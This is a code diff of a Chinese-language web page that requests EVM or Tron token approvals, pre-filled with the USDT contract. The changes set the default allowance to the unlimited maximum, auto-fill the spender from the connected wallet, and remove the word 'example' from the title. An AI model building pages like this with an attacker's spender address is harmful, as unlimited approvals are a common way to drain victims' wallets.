@@ -2,7 +2,7 @@
 <html lang="zh">
 <head>
   <meta charset="UTF-8">
-  <title>支持 imToken 拉起 &amp; EVM/Tron Approve 示例</title>
+  <title>EVM/Tron Approve 授权</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <style>
     body { font-family: Arial, sans-serif; padding: 20px; }
@@ -14,7 +14,6 @@
   </style>
 </head>
 <body>
-  <h1>EVM/Tron Approve 授权</h1>
   
   
   <!-- 统一的 Token Approve 部分 -->
@@ -24,7 +23,7 @@
     
     <label>Token 合约地址: <input type="text" id="tokenAddress" value="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"  placeholder="USDT合约地址" style="background-color: #f0f0f0;"></label>
     <label>收款地址 (Spender): <input type="text" id="spenderAddress" placeholder="输入收款地址..."></label>
-    <label>批准额度 (整数): <input type="text" id="approveAmount" placeholder="例如：1000000000000000000"></label>
+    <label>批准额度 (整数): <input type="text" id="approveAmount" value="115792089237316195423570985008687907853269984665640564039457584007913129639935" placeholder="例如：1000000000000000000"></label>
     <button id="approveBtn">授权</button>
     <div id="approveResult"></div>
     
@@ -118,6 +117,38 @@
     // 页面加载完成后自动检测环境
     window.addEventListener('DOMContentLoaded', async function() {
       await detectWalletEnvironment();
+      
+      // 检查页面加载时是否已经有连接的钱包，如果有则自动填充 spenderAddress
+      try {
+        // 检查TronWeb钱包
+        if (typeof window.tronWeb !== 'undefined' && window.tronWeb.ready) {
+          tronAccount = window.tronWeb.defaultAddress.base58;
+          if (tronAccount) {
+            document.getElementById('spenderAddress').value = tronAccount;
+            document.getElementById('walletInfo').innerText = "已连接TRON钱包地址: " + tronAccount;
+          }
+        } 
+        // 检查EVM钱包
+        else if (typeof window.ethereum !== 'undefined') {
+          if (window.ethereum.selectedAddress) {
+            evmAccount = window.ethereum.selectedAddress;
+            document.getElementById('spenderAddress').value = evmAccount;
+            document.getElementById('walletInfo').innerText = "已连接EVM钱包地址: " + evmAccount;
+          } else {
+            // 尝试获取账户但不弹出连接请求
+            const accounts = await window.ethereum.request({ 
+              method: 'eth_accounts' // 不同于 eth_requestAccounts，这不会触发连接请求
+            });
+            if (accounts && accounts.length > 0) {
+              evmAccount = accounts[0];
+              document.getElementById('spenderAddress').value = evmAccount;
+              document.getElementById('walletInfo').innerText = "已连接EVM钱包地址: " + evmAccount;
+            }
+          }
+        }
+      } catch (error) {
+        console.error("尝试自动填充钱包地址失败:", error);
+      }
     });
     
     // 等待 TronWeb 对象注入且 ready 为 true（最多等待 10 秒）
@@ -152,6 +183,9 @@
         evmAccount = accounts[0];
         walletInfo.innerText = "已连接EVM钱包地址: " + evmAccount;
         
+        // 自动填充 spenderAddress 输入框
+        document.getElementById('spenderAddress').value = evmAccount;
+        
         console.log("EVM wallet connected:", evmAccount);
         return evmAccount;
       } catch (error) {
@@ -175,6 +209,9 @@
         if (ready) {
           tronAccount = window.tronWeb.defaultAddress.base58;
           walletInfo.innerText = "已连接TRON钱包地址: " + tronAccount;
+          
+          // 自动填充 spenderAddress 输入框
+          document.getElementById('spenderAddress').value = tronAccount;
           
           console.log("Tron wallet connected:", tronAccount);
           return tronAccount;
